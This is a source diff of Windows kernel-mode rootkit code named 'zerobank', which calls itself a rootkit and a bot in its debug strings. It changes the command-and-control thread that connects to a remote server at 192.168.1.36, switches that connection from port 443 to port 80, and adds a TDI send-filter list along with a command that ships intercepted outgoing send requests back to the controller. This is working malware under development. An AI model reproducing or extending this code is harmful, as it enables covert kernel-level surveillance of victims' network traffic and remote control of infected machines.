@@ -591,15 +591,19 @@ VOID zerobank_communication_worker_thread(PVOID Context)
 	INT recvsize = 0;
 	g_ctx = (PZEROBANK_COMMUNICATION_CTX)Context;
 
+	KeSetPriorityThread(KeGetCurrentThread(), LOW_REALTIME_PRIORITY);
+
 	// bind the socket
 
 	bind(&socket_handle, &socket, g_ctx->g_Hash);
 
 	// connect to the remote server
 
-	connect(&socket, 443, 192, 168, 1, 36, g_ctx->g_Hash);
+	connect(&socket, 80, 192, 168, 1, 36, g_ctx->g_Hash);
 
-	// send crypted bot-header
+	// send crypted bot-header, if for some reason sending
+	// the header fails, theres no point in keep going
+
 	if (zerobank_bot_header(socket, g_ctx->g_Hash) == FALSE)
 		return;
 
@@ -699,41 +703,45 @@ VOID zerobank_communication_worker_thread(PVOID Context)
 			break;
 		case ZB_START_TDI_FILTER:
 			KdPrint(("\r\n__rootkit__start__tdi__filter plugin selected"));
-			
-			// Initialize Filter ListHead
-				
+
+			// Initialize TDI_CONNECT ListHead
+
 			g_filter_head = (PZEROBANK_FILTER_HEAD)g_ctx->g_Hash->_ExAllocatePool(NonPagedPool, sizeof(ZEROBANK_FILTER_HEAD));
 			InitializeListHead(&g_filter_head->Entry);
 			g_filter_head->NumberOfConnections = 0;
 
-				
+			// Initialize TDI_SEND listhead
+
+			g_send_head = (PZEROBANK_SEND_HEAD)g_ctx->g_Hash->_ExAllocatePool(NonPagedPool, sizeof(ZEROBANK_SEND_HEAD));
+			InitializeListHead(&g_send_head->Entry);
+			g_send_head->NumberOfEntries = 0;
+
 			// pass parameters to tdi struct
 			// and start TDI filter thread
-
 
 			tdi->Hash = g_ctx->g_Hash;
 			tdi->pDriverObject = g_ctx->pDriverObjectCtx;
 
 			st = g_rk_connect_start_filter(tdi);
 			
-
 			break;
 		case ZB_STOP_TDI_FILTER:
 			KdPrint(("\r\n__rootkit__stop__tdi__filter plugin selected"));
-
 			// detach device from Tcp
-
 			IoDetachDevice((PDEVICE_OBJECT)g_ctx->pDriverObjectCtx->DeviceObject->DeviceExtension);
-			
 			// delete device and clean up
-
 			IoDeleteDevice(g_ctx->pDriverObjectCtx->DeviceObject);
-
 			break;
 		case ZB_GET_BOT_CONNECTIONS:
 			KdPrint(("\r\n__rootkit__get__bot__connections plugin selected"));
 
 			g_rk_send_connections_to_userspace(socket, g_ctx->g_Hash);
+
+			break;
+		case ZB_GET_BOT_SEND_REQUESTS:
+			KdPrint(("\r\n__rootkit__get__bot__send__requests plugin selected"));
+
+			g_rk_sendrequests_to_userspace(socket, g_ctx->g_Hash);
 
 			break;
 		default:
